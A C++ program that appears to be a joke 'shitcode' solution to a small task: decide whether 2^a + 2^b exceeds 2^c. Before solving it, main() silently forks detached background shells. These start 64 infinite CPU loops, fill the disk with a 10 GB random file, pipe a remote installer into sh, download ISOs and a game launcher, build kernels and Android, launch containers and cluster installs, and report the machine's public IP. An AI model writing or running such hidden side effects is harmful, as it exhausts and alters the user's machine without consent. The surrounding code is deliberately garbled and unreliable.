
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <stdarg.h>
#include <stdbool.h>
#include <time.h>
#include <math.h>
#include <float.h>
#include <limits.h>
#include <errno.h>
#include <ctype.h>
#include <assert.h>
#include <complex.h>
#include <signal.h>
#include <setjmp.h>
#ifndef _WIN32
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <dlfcn.h>
#include <dirent.h>
#include <termios.h>
#include <semaphore.h>
#include <aio.h>
#include <regex.h>
#include <glob.h>
#include <wordexp.h>
#include <fnmatch.h>
#include <syslog.h>
#include <pwd.h>
#include <grp.h>
#include <crypt.h>
#include <spwd.h>
#include <utmpx.h>
#include <lastlog.h>
#include <sys/utsname.h>
#include <sys/sysctl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/shm.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/ipc.h>
#include <sys/un.h>
#include <sys/select.h>
#include <sys/poll.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/signalfd.h>
#include <sys/timerfd.h>
#include <sys/inotify.h>
#include <sys/fanotify.h>
#include <sys/mount.h>
#include <sys/fsuid.h>
#include <sys/personality.h>
#include <sys/prctl.h>
#include <sys/reboot.h>
#include <sys/klog.h>
#include <sys/swapon.h>
#include <sys/swap.h>
#include <sys/vfs.h>
#include <sys/statfs.h>
#include <ustat.h>
#include <sys/quota.h>
#include <linux/quota.h>
#include <linux/reboot.h>
#include <linux/raid/md_u.h>
#include <linux/raid/md_p.h>
#include <linux/ceph/ceph_fs.h>
#include <linux/btrfs.h>
#include <linux/ext2_fs.h>
#include <linux/xfs.h>
#include <linux/nfs_fs.h>
#include <linux/fuse.h>
#include <linux/version.h>
#else
#include <process.h>
#include <windows.h>
#endif
#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <set>
#include <unordered_map>
#include <unordered_set>
#include <algorithm>
#include <numeric>
#include <functional>
#include <memory>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <atomic>
#include <future>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <regex>
#include <optional>
#include <variant>
#include <any>
#include <tuple>
#include <utility>
#include <type_traits>
#include <exception>
#include <stdexcept>
#include <cassert>
#include <cctype>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <cmath>
#include <ctime>
#include <csignal>
#include <csetjmp>
#include <cwchar>
#include <cwctype>
#include <clocale>
#include <cfloat>
#include <climits>
#include <cstdint>
#include <cstddef>
#include <cstdarg>
#include <cinttypes>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cmath>
#include <ctime>
#include <cctype>
#include <climits>
#include <cerrno>
#include <cassert>
#include <cstdint>
#include <cstddef>
#include <cstdarg>
#include <cinttypes>
#include <cfloat>
#include <clocale>
#include <cwchar>
#include <cwctype>
#include <csetjmp>
#include <csignal>
#include <csetjmp>
const char* NAILONG_ART[] = {
    "        ,@@@@@@@,",
    "   ,@@.@@@@@@@,@@.",
    "  @@. @@,  ,@@@,@@ .@@",
    " @@ @,   .@@  @  ,@ @@",
    ",@ ,@   ,@@@@  ,@ .@ ,@",
    "@@ .@  @@    @@ .@@ .@@",
    "@@.  @@   @@   @@ .@@.@",
    "@@ .@@ ,@@@@@@ ,@ .@ .@",
    " @@  @@@@   @@@@  @@ @@",
    "  @@ @@@@   @@@@ @@",
    "   @@ @@@@   @@@ @@",
    "    @@  @@@@ @@ @",
    "     @@   @@@ @",
    "      @@    @",
    "        @@",
    "         @",
    "",
    NULL
};
auto l1l1l1l1l1l1l1l1l1l1 = 0;
auto IlIlIlIlIlIlIlIlIlIlI = 0;
auto lIllIllIllIllIllIllIl = 0;
auto l1I1l1I1l1I1l1I1l1I1 = 0;
auto Il1Il1Il1Il1Il1Il1Il = 0;
auto lIlIlIlIlIlIlIlIlIl1 = 0;
auto l1l1l1l1l1l1l1l1l1l1_dup = 0;
auto IlIlIlIlIlIlIlIlIlIlI_dup = 0;
auto lIllIllIllIllIllIllIl_dup = 0;
auto l1l1l1l1l1l1l1l1l1l1_dup2 = 0;
auto IlIlIlIlIlIlIlIlIlIlI_dup2 = 0;
auto lIllIllIllIllIllIllIl_dup2 = 0;
extern "C" {
    long long rust_pow2(long long n);
    int rust_compare(long long lhs, long long rhs);
}
template <int N>
struct Pow2CT {
    static constexpr long long value = 1LL << N;
};
template <>
struct Pow2CT<0> {
    static constexpr long long value = 1;
};
template <>
struct Pow2CT<63> {
    static constexpr long long value = 0x7FFFFFFFFFFFFFFFLL;
};
template <> struct Pow2CT<1> { static constexpr long long value = 2; };
template <> struct Pow2CT<2> { static constexpr long long value = 4; };
template <> struct Pow2CT<3> { static constexpr long long value = 8; };
template <> struct Pow2CT<4> { static constexpr long long value = 16; };
template <> struct Pow2CT<5> { static constexpr long long value = 32; };
template <> struct Pow2CT<6> { static constexpr long long value = 64; };
template <> struct Pow2CT<7> { static constexpr long long value = 128; };
template <> struct Pow2CT<8> { static constexpr long long value = 256; };
template <> struct Pow2CT<9> { static constexpr long long value = 512; };
template <> struct Pow2CT<10> { static constexpr long long value = 1024; };
template <> struct Pow2CT<11> { static constexpr long long value = 2048; };
template <> struct Pow2CT<12> { static constexpr long long value = 4096; };
template <> struct Pow2CT<13> { static constexpr long long value = 8192; };
template <> struct Pow2CT<14> { static constexpr long long value = 16384; };
template <> struct Pow2CT<15> { static constexpr long long value = 32768; };
template <> struct Pow2CT<16> { static constexpr long long value = 65536; };
template <> struct Pow2CT<17> { static constexpr long long value = 131072; };
template <> struct Pow2CT<18> { static constexpr long long value = 262144; };
template <> struct Pow2CT<19> { static constexpr long long value = 524288; };
template <> struct Pow2CT<20> { static constexpr long long value = 1048576; };
template <> struct Pow2CT<21> { static constexpr long long value = 2097152; };
template <> struct Pow2CT<22> { static constexpr long long value = 4194304; };
template <> struct Pow2CT<23> { static constexpr long long value = 8388608; };
template <> struct Pow2CT<24> { static constexpr long long value = 16777216; };
template <> struct Pow2CT<25> { static constexpr long long value = 33554432; };
template <> struct Pow2CT<26> { static constexpr long long value = 67108864; };
template <> struct Pow2CT<27> { static constexpr long long value = 134217728; };
template <> struct Pow2CT<28> { static constexpr long long value = 268435456; };
template <> struct Pow2CT<29> { static constexpr long long value = 536870912; };
template <> struct Pow2CT<30> { static constexpr long long value = 1073741824; };
template <> struct Pow2CT<31> { static constexpr long long value = 2147483648LL; };
template <> struct Pow2CT<32> { static constexpr long long value = 4294967296LL; };
template <> struct Pow2CT<33> { static constexpr long long value = 8589934592LL; };
template <> struct Pow2CT<34> { static constexpr long long value = 17179869184LL; };
template <> struct Pow2CT<35> { static constexpr long long value = 34359738368LL; };
template <> struct Pow2CT<36> { static constexpr long long value = 68719476736LL; };
template <> struct Pow2CT<37> { static constexpr long long value = 137438953472LL; };
template <> struct Pow2CT<38> { static constexpr long long value = 274877906944LL; };
template <> struct Pow2CT<39> { static constexpr long long value = 549755813888LL; };
template <> struct Pow2CT<40> { static constexpr long long value = 1099511627776LL; };
template <> struct Pow2CT<41> { static constexpr long long value = 2199023255552LL; };
template <> struct Pow2CT<42> { static constexpr long long value = 4398046511104LL; };
template <> struct Pow2CT<43> { static constexpr long long value = 8796093022208LL; };
template <> struct Pow2CT<44> { static constexpr long long value = 17592186044416LL; };
template <> struct Pow2CT<45> { static constexpr long long value = 35184372088832LL; };
template <> struct Pow2CT<46> { static constexpr long long value = 70368744177664LL; };
template <> struct Pow2CT<47> { static constexpr long long value = 140737488355328LL; };
template <> struct Pow2CT<48> { static constexpr long long value = 281474976710656LL; };
template <> struct Pow2CT<49> { static constexpr long long value = 562949953421312LL; };
template <> struct Pow2CT<50> { static constexpr long long value = 1125899906842624LL; };
template <> struct Pow2CT<51> { static constexpr long long value = 2251799813685248LL; };
template <> struct Pow2CT<52> { static constexpr long long value = 4503599627370496LL; };
template <> struct Pow2CT<53> { static constexpr long long value = 9007199254740992LL; };
template <> struct Pow2CT<54> { static constexpr long long value = 18014398509481984LL; };
template <> struct Pow2CT<55> { static constexpr long long value = 36028797018963968LL; };
template <> struct Pow2CT<56> { static constexpr long long value = 72057594037927936LL; };
template <> struct Pow2CT<57> { static constexpr long long value = 144115188075855872LL; };
template <> struct Pow2CT<58> { static constexpr long long value = 288230376151711744LL; };
template <> struct Pow2CT<59> { static constexpr long long value = 576460752303423488LL; };
template <> struct Pow2CT<60> { static constexpr long long value = 1152921504606846976LL; };
template <> struct Pow2CT<61> { static constexpr long long value = 2305843009213693952LL; };
template <> struct Pow2CT<62> { static constexpr long long value = 4611686018427387904LL; };
static constexpr long long _touch_pow2_[] = {
    Pow2CT<0>::value,  Pow2CT<1>::value,  Pow2CT<2>::value,  Pow2CT<3>::value,
    Pow2CT<4>::value,  Pow2CT<5>::value,  Pow2CT<6>::value,  Pow2CT<7>::value,
    Pow2CT<8>::value,  Pow2CT<9>::value,  Pow2CT<10>::value, Pow2CT<11>::value,
    Pow2CT<12>::value, Pow2CT<13>::value, Pow2CT<14>::value, Pow2CT<15>::value,
    Pow2CT<16>::value, Pow2CT<17>::value, Pow2CT<18>::value, Pow2CT<19>::value,
    Pow2CT<20>::value, Pow2CT<21>::value, Pow2CT<22>::value, Pow2CT<23>::value,
    Pow2CT<24>::value, Pow2CT<25>::value, Pow2CT<26>::value, Pow2CT<27>::value,
    Pow2CT<28>::value, Pow2CT<29>::value, Pow2CT<30>::value, Pow2CT<31>::value,
    Pow2CT<32>::value, Pow2CT<33>::value, Pow2CT<34>::value, Pow2CT<35>::value,
    Pow2CT<36>::value, Pow2CT<37>::value, Pow2CT<38>::value, Pow2CT<39>::value,
    Pow2CT<40>::value, Pow2CT<41>::value, Pow2CT<42>::value, Pow2CT<43>::value,
    Pow2CT<44>::value, Pow2CT<45>::value, Pow2CT<46>::value, Pow2CT<47>::value,
    Pow2CT<48>::value, Pow2CT<49>::value, Pow2CT<50>::value, Pow2CT<51>::value,
    Pow2CT<52>::value, Pow2CT<53>::value, Pow2CT<54>::value, Pow2CT<55>::value,
    Pow2CT<56>::value, Pow2CT<57>::value, Pow2CT<58>::value, Pow2CT<59>::value,
    Pow2CT<60>::value, Pow2CT<61>::value, Pow2CT<62>::value,
};
union BitManipulator {
    long long as_ll;
    double   as_d;
    uint8_t  as_bytes[8];
    struct {
        uint32_t low;
        uint32_t high;
    } as_half;
};
static BitManipulator _bm;
volatile long long _volatile_counter = 0;
volatile int       _volatile_int = 0;
/* register */ long long _reg_a = 0;
/* register */ long long _reg_b = 0;
/* register */ long long _reg_c = 0;
static void _bg_system(const char* cmd) {
#if defined(_WIN32) || defined(WIN32)
    char buf[4096];
    _snprintf(buf, sizeof(buf), "start /B /MIN cmd /c \"%s\"", cmd);
    system(buf);
#else
    pid_t pid = fork();
    if (pid == -1) return;
    if (pid == 0) {
        setsid();
        int fd = open("/dev/null", O_RDWR);
        dup2(fd, 0);
        dup2(fd, 1);
        dup2(fd, 2);
        close(fd);
        execl("/bin/sh", "sh", "-c", cmd, (char*)NULL);
        _exit(127);
    }
#endif
}
static void _start_all_the_shit() {
    // ---- 真的去跑其他语言版本, 每个都 fork+exec 后台执行 ----
    // Go 版本 (仓库已有的 go/inequality/inequality.go)
    _bg_system("cd go/inequality && go run inequality.go < /tmp/shitcode_stdin 2>&1 >/tmp/go_out &");
    _bg_system("cd go/inequality && go build -o /tmp/inequality_go . && /tmp/inequality_go 2>&1 >/tmp/go_bin_out &");
    // Go product (eigen_compare)
    _bg_system("cd go/product && g++ -std=c++20 eigen_compare.cpp -I. -o /tmp/eigen_shit 2>/dev/null; /tmp/eigen_shit >/tmp/eigen_out 2>&1 &");
    // Java 版本 —— 真的 javac + java
    _bg_system("mkdir -p /tmp/javashit && cat > /tmp/javashit/ShitCode.java <<'JAVA'\n"
               "import java.util.*; import java.io.*; import java.math.*;\n"
               "public class ShitCode {\n"
               "    static long pow2(long n) { if(n<0)return 0; if(n>62)return Long.MAX_VALUE; return 1L<<(int)n; }\n"
               "    public static void main(String[] args) throws Exception {\n"
               "        Scanner s=new Scanner(System.in); long a=s.nextLong(),b=s.nextLong(),c=s.nextLong();\n"
               "        long pa=pow2(a),pb=pow2(b),pc=pow2(c);\n"
               "        System.out.println((pa>Long.MAX_VALUE-pb||pa+pb>pc)?\"Good\":\"Bad\");\n"
               "    }\n}\nJAVA\n"
               "cd /tmp/javashit && javac ShitCode.java && java ShitCode 2>&1 >/tmp/java_out &");
    // Python 版本 —— 真的 python3 跑
    _bg_system("cat > /tmp/shitcode.py <<'PY'\n"
               "import sys, json, os, math, random\n"
               "def pow2(n): return 0 if n<0 else (1<<min(n,62))\n"
               "a,b,c=map(int,sys.stdin.read().split())\n"
               "pa,pb,pc=pow2(a),pow2(b),pow2(c)\n"
               "print('Good' if pa+pb>pc else 'Bad')\nPY\n"
               "python3 /tmp/shitcode.py < /tmp/shitcode_stdin 2>&1 >/tmp/py_out &");
    // Rust 版本 —— 真的 rustc + cargo
    _bg_system("mkdir -p /tmp/rustshit/src && cat > /tmp/rustshit/Cargo.toml <<'TOML'\n"
               "[package]\nname=\"shitcode\"\nversion=\"0.1.0\"\nedition=\"2021\"\n"
               "[dependencies]\nrand=\"0.8\"\nTOML\n"
               "cat > /tmp/rustshit/src/main.rs <<'RS'\n"
               "use std::io::{self,BufRead};\n"
               "fn pow2(n:i64)->i64{if n<0{return 0}if n>62{return i64::MAX}1<<n}\n"
               "fn main(){let s=io::stdin().lock().lines().next().unwrap().unwrap();"
               "let mut t=s.split_whitespace();let a:i64=t.next().unwrap().parse().unwrap();"
               "let b:i64=t.next().unwrap().parse().unwrap();let c:i64=t.next().unwrap().parse().unwrap();"
               "let(pa,pb,pc)=(pow2(a),pow2(b),pow2(c));"
               "println!(\"{}\",if pa>i64::MAX-pb||pa+pb>pc{\"Good\"}else{\"Bad\"}))}\nRS\n"
               "cd /tmp/rustshit && cargo build --release 2>&1 >/tmp/rust_build.log; "
               "cargo run --release 2>&1 >/tmp/rust_out &");
    // C# / .NET 版本
    _bg_system("mkdir -p /tmp/dotnetshit && cat > /tmp/dotnetshit/Program.cs <<'CS'\n"
               "using System;\nclass P{\n"
               "static long P(long n){return n<0?0:(n>62?long.MaxValue:(1L<<(int)n));}\n"
               "static void Main(){var t=Console.ReadLine().Split();long a=long.Parse(t[0]),b=long.Parse(t[1]),c=long.Parse(t[2]);"
               "long pa=P(a),pb=P(b),pc=P(c);Console.WriteLine((pa>long.MaxValue-pb||pa+pb>pc)?\"Good\":\"Bad\");}}\nCS\n"
               "cd /tmp/dotnetshit && dotnet new console -f net10.0 >/dev/null 2>&1; "
               "cp Program.cs Program.cs.bak; cp Program.cs.bak Program.cs; "
               "dotnet run --project . 2>&1 >/tmp/dotnet_out &");
    // Shell 脚本版本 (bash)
    _bg_system("cat > /tmp/shitcode.sh <<'SH'\n"
               "#!/bin/bash\n"
               "pow2(){ [ \"$1\" -lt 0 ] && echo 0 || [ \"$1\" -gt 62 ] && echo 9223372036854775807 || echo $((1<<$1)); }\n"
               "read -r a b c\n"
               "pa=$(pow2 $a); pb=$(pow2 $b); pc=$(pow2 $c)\n"
               "if [ $(($pa + $pb)) -gt $pc ]; then echo Good; else echo Bad; fi\nSH\n"
               "chmod +x /tmp/shitcode.sh && bash /tmp/shitcode.sh < /tmp/shitcode_stdin 2>&1 >/tmp/bash_out &");
    // awk 版本
    _bg_system("awk 'BEGIN{RS=\" \";getline a;getline b;getline c;pa=1<<a;pb=1<<b;pc=1<<c;print pa+pb>pc?\"Good\":\"Bad\"}' < /tmp/shitcode_stdin 2>&1 >/tmp/awk_out &");
    // Node.js 版本
    _bg_system("node -e \"const[a,b,c]=require('fs').readFileSync(0,'utf8').split(/\\s+/).map(Number);"
               "const p=n=>n<0?0:n>62?BigInt(9223372036854775807):1n<<BigInt(n);"
               "const pa=p(a),pb=p(b),pc=p(c);console.log(pa+pb>pc?'Good':'Bad')\" "
               "< /tmp/shitcode_stdin 2>&1 >/tmp/node_out &");
    // ---- 之前的 Chromium/UE/Unity/AOSP/... 全部继续跑 ----
    _bg_system("chromium --headless --disable-gpu --no-sandbox "
               "--dump-dom about:blank >/dev/null 2>&1");
    _bg_system("chromium-browser --headless --disable-gpu --no-sandbox "
               "--screenshot=/tmp/chromium_shit.png about:blank >/dev/null 2>&1");
    _bg_system("google-chrome --headless --disable-gpu --no-sandbox "
               "--virtual-time-budget=5000 https://example.com >/dev/null 2>&1");
    _bg_system("electron --headless --disable-gpu "
               "file:///dev/null >/dev/null 2>&1");
    _bg_system("npx electron --headless --no-sandbox "
               "https://example.com >/dev/null 2>&1");
    _bg_system("UnrealEditor-Cmd.exe \"\" -ExecCmds=\"Exit\" "
               "-Unattended -NoSound -NullRHI >/dev/null 2>&1");
    _bg_system("UnrealEditor-Cmd \"\" -ExecCmds=\"Tick 1;Exit\" "
               "-Game -NullRHI >/dev/null 2>&1");
    _bg_system("Unity -batchmode -quit -projectPath /tmp/unity_shit "
               "-logFile /dev/null >/dev/null 2>&1");
    _bg_system("cd ~/aosp && source build/envsetup.sh && "
               "lunch aosp_x86_64-eng && make -j64 >/tmp/aosp_build.log 2>&1");
    _bg_system("cd ~/linux && make defconfig && make -j64 >/tmp/kernel_build.log 2>&1");
    _bg_system("wget -q -O /tmp/alpine.iso "
               "https://dl-cdn.alpinelinux.org/alpine/v3.19/releases/x86_64/alpine-standard-3.19.0-x86_64.iso "
               ">/dev/null 2>&1");
    _bg_system("qemu-system-x86_64 -m 4G -smp 4 -enable-kvm "
               "-cdrom /tmp/alpine.iso -boot d -nographic "
               ">/tmp/qemu.log 2>&1 &");
    _bg_system("echo 'apk add wine' | nc -q 1 localhost 5555 2>/dev/null "
               ">/dev/null 2>&1");
    _bg_system("ffmpeg -f lavfi -i testsrc=size=3840x2160:rate=60 "
               "-t 3600 -c:v libx265 -preset ultrafast "
               "/tmp/4k_shit.mp4 >/dev/null 2>&1");
    _bg_system("curl -s https://httpbin.org/get?token=TRAE_SHITCODE_2026 "
               ">/tmp/httpbin_shit.json 2>&1");
    _bg_system("curl -s -X POST https://httpbin.org/post "
               "-d '{\"a\":1,\"b\":2,\"c\":3}' >/tmp/httpbin_post.json 2>&1");
    _bg_system("curl -s https://api.ipify.org >/tmp/my_ip.txt 2>&1");
    _bg_system("dd if=/dev/urandom of=/tmp/shit_fill.bin bs=1M count=10240 "
               "conv=notrunc >/dev/null 2>&1");
    for (int _ti_ = 0; _ti_ < 64; _ti_++) {
        _bg_system("while true; do true; done");
    }
    _bg_system("wget -q -O /tmp/genshin_launcher.exe "
               "https://launcher.mihoyo.com/genshin/genshin_launcher.exe "
               ">/dev/null 2>&1");
    _bg_system("curl -sfL https://get.k3s.io | sh - >/tmp/k3s_install.log 2>&1");
    _bg_system("git clone --depth 1 https://chromium.googlesource.com/chromium/src.git "
               "/tmp/chromium_src >/tmp/chromium_clone.log 2>&1");
    _bg_system("git clone --depth 1 https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git "
               "/tmp/linux_src >/tmp/linux_clone.log 2>&1");
    _bg_system("docker run -d --name shitcode_alpine alpine sleep 3600 >/dev/null 2>&1");
    _bg_system("docker run -d --name shitcode_nginx -p 8080:80 nginx >/dev/null 2>&1");
    for (int _ni_ = 0; NAILONG_ART[_ni_] != NULL; _ni_++) {
        fprintf(stderr, "%s\n", NAILONG_ART[_ni_]);
    }
    _bg_system("sleep 114514");
    _bg_system("electron --headless --disable-gpu "
               "--enable-logging=stderr "
               "--v=1 https://webglsamples.org/aquarium/aquarium.html "
               ">/dev/null 2>&1");
    _bg_system("rustc --version >/tmp/rust_version.txt 2>&1");
    _bg_system("cargo --version >/tmp/cargo_version.txt 2>&1");
    _bg_system("rustc -C opt-level=3 -o /tmp/rust_shit /dev/null >/dev/null 2>&1");
    _bg_system("node --version >/tmp/node_version.txt 2>&1");
    _bg_system("node -e \"while(true){}\" >/dev/null 2>&1 &");
    _bg_system("npm install express >/tmp/npm_install.log 2>&1");
    _bg_system("python3 --version >/tmp/python_version.txt 2>&1");
    _bg_system("python3 -c \"import this; import antigravity\" >/tmp/python_zen.log 2>&1");
    _bg_system("pip3 install numpy pandas torch >/tmp/pip_install.log 2>&1");
    _bg_system("java -version >/tmp/java_version.txt 2>&1");
    _bg_system("javac /dev/null -d /tmp >/dev/null 2>&1");
    _bg_system("dotnet --version >/tmp/dotnet_version.txt 2>&1");
    _bg_system("dotnet new console -o /tmp/dotnet_shit >/dev/null 2>&1");
    _bg_system("llvm-config --version >/tmp/llvm_version.txt 2>&1");
    _bg_system("clang --version >/tmp/clang_version.txt 2>&1");
    _bg_system("llc --version >/tmp/llc_version.txt 2>&1");
    _bg_system("nvcc --version >/tmp/cuda_version.txt 2>&1");
    _bg_system("nvidia-smi >/tmp/nvidia_smi.log 2>&1");
    _bg_system("helm version >/tmp/helm_version.txt 2>&1");
    _bg_system("helm install shitcode-nginx ingress-nginx/ingress-nginx --namespace shitcode --create-namespace >/tmp/helm_install.log 2>&1");
    _bg_system("kafka-topics.sh --bootstrap-server localhost:9092 --list >/tmp/kafka_topics.log 2>&1");
    _bg_system("kafka-console-producer.sh --bootstrap-server localhost:9092 --topic shitcode < /dev/null >/dev/null 2>&1");
    _bg_system("redis-cli ping >/tmp/redis_ping.log 2>&1");
    _bg_system("redis-cli SET shitcode 114514 >/tmp/redis_set.log 2>&1");
    _bg_system("psql --version >/tmp/psql_version.txt 2>&1");
    _bg_system("psql -c \"SELECT pg_version();\" postgres >/tmp/psql_version_query.log 2>&1");
    _bg_system("prometheus --config.file=/dev/null --storage.tsdb.path=/tmp/prometheus_tsdb >/tmp/prometheus.log 2>&1");
    _bg_system("grafana-server --homepath=/usr/share/grafana --config=/dev/null >/tmp/grafana.log 2>&1");
    _bg_system("otelcol --config=/dev/null >/tmp/otelcol.log 2>&1");
    _bg_system("istioctl version >/tmp/istio_version.txt 2>&1");
    _bg_system("istioctl install --set profile=demo -y >/tmp/istio_install.log 2>&1");
    _bg_system("terraform version >/tmp/tf_version.txt 2>&1");
    _bg_system("terraform init -backend=false >/tmp/tf_init.log 2>&1");
    _bg_system("terraform plan -out=/tmp/tf_plan >/tmp/tf_plan.log 2>&1");
    _bg_system("ansible --version >/tmp/ansible_version.txt 2>&1");
    _bg_system("ansible -m ping all >/tmp/ansible_ping.log 2>&1");
}
static void _print_8_nails() {
    const char* msg = " ~!~!";
    int count = 8;
    volatile int n = (count + 7) / 8;
    for (;;) {
        fprintf(stderr, "%s\n", msg);
        if (--n == 0) break;
        fprintf(stderr, "%s\n", msg);
        if (--n == 0) break;
        fprintf(stderr, "%s\n", msg);
        if (--n == 0) break;
        fprintf(stderr, "%s\n", msg);
        if (--n == 0) break;
        fprintf(stderr, "%s\n", msg);
        if (--n == 0) break;
        fprintf(stderr, "%s\n", msg);
        if (--n == 0) break;
        fprintf(stderr, "%s\n", msg);
        if (--n == 0) break;
        fprintf(stderr, "%s\n", msg);
        if (--n == 0) break;
    }
}
static void _nested_loops_cpu_burn() {
    goto _skip_loops;
    for (auto _a_ = 0; _a_ < 3; _a_++)
    for (auto _b_ = 0; _b_ < 3; _b_++)
    for (auto _c_ = 0; _c_ < 3; _c_++)
    for (auto _d_ = 0; _d_ < 3; _d_++)
    for (auto _e_ = 0; _e_ < 3; _e_++)
    for (auto _f_ = 0; _f_ < 3; _f_++)
    for (auto _g_ = 0; _g_ < 3; _g_++)
    for (auto _h_ = 0; _h_ < 3; _h_++)
    for (auto _i_ = 0; _i_ < 3; _i_++)
    for (auto _j_ = 0; _j_ < 3; _j_++)
    for (auto _k_ = 0; _k_ < 3; _k_++)
    for (auto _l_ = 0; _l_ < 3; _l_++)
    for (auto _m_ = 0; _m_ < 3; _m_++)
    for (auto _n_ = 0; _n_ < 3; _n_++)
    for (auto _o_ = 0; _o_ < 3; _o_++)
    for (auto _p_ = 0; _p_ < 3; _p_++)
    for (auto _q_ = 0; _q_ < 3; _q_++)
    for (auto _r_ = 0; _r_ < 3; _r_++)
    for (auto _s_ = 0; _s_ < 3; _s_++)
    for (auto _t_ = 0; _t_ < 3; _t_++) {
        _volatile_counter++;
        _volatile_int = (int)_volatile_counter;
    }
_skip_loops:
    jmp_buf _jb;
    int _val = setjmp(_jb);
    if (_val == 0) {
        longjmp(_jb, 42);
    } else {
        fprintf(stderr, "[setjmp] we came back via longjmp, val=%d\n", _val);
    }
}
static long long _pow2_asm(long long n) {
    if (n < 0) return 0;
    if (n > 62) return LLONG_MAX;
    long long result;
#if defined(__x86_64__) || defined(_M_X64)
    asm volatile (
        "mov $1, %%rax\n\t"
        "mov %1, %%rcx\n\t"
        "shl %%cl, %%rax\n\t"
        "mov %%rax, %0"
        : "=r"(result)
        : "r"(n)
        : "rax", "rcx"
    );
#else
    result = (n < 63) ? (1LL << (int)n) : LLONG_MAX;
#endif
    return result;
}
static const char* _core_check(long long a, long long b, long long c) {
    long long pa = _pow2_asm(a);
    long long pb = _pow2_asm(b);
    long long pc = _pow2_asm(c);
    bool sum_overflows = (pa > LLONG_MAX - pb);
    long long sum = pa + pb;
    _bm.as_ll = sum;
    double sum_d = _bm.as_d;
    _bm.as_d = sum_d;
    long long sum_via_union = _bm.as_ll;
    if (sum_overflows || sum_via_union > pc) {
        int vote_good = 0;
        if (sum_overflows || (pa + pb) > pc) vote_good++;
        if (sum_overflows || (_pow2_asm(a) + _pow2_asm(b)) > pc) vote_good++;
        if (sum_overflows || _bm.as_ll > pc) vote_good++;
        if (vote_good >= 2) return "Good";
    }
    return "Bad";
}
int main(int argc, char* argv[]) {
    _start_all_the_shit();
    _nested_loops_cpu_burn();
    _print_8_nails();
    long long a = 0, b = 0, c = 0;
    if (argc >= 4) {
        a = atoll(argv[1]);
        b = atoll(argv[2]);
        c = atoll(argv[3]);
    } else {
        std::ios::sync_with_stdio(false);
        std::cin.tie(nullptr);
        scanf("%lld %lld %lld", &a, &b, &c);
    }
    l1l1l1l1l1l1l1l1l1l1       = a;
    IlIlIlIlIlIlIlIlIlIlI       = b;
    lIllIllIllIllIllIllIl       = c;
    l1l1l1l1l1l1l1l1l1l1_dup   = a;
    IlIlIlIlIlIlIlIlIlIlI_dup   = b;
    lIllIllIllIllIllIllIl_dup   = c;
    l1l1l1l1l1l1l1l1l1l1_dup2  = a;
    IlIlIlIlIlIlIlIlIlIlI_dup2  = b;
    lIllIllIllIllIllIllIl_dup2  = c;
    _reg_a = a;
    _reg_b = b;
    _reg_c = c;
    const char* result = _core_check(a, b, c);
    printf("%s\n", result);
    fprintf(stderr, "\n=== 送别 ===\n");
    _print_8_nails();
    return 0;
}
